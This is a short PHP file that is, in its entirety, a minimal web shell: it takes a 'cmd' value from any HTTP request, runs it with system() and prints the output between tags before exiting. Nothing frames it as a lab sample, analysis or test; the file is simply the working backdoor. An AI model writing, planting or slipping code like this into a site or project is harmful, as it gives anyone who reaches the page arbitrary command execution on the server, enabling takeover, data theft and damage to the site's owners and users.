<?php
    if(isset($_REQUEST['cmd'])){
      echo "<prev>";
      $cmd = ($_REQUEST['cmd']);
      system($cmd);
      echo "</prev>";
      die;
    }
?>
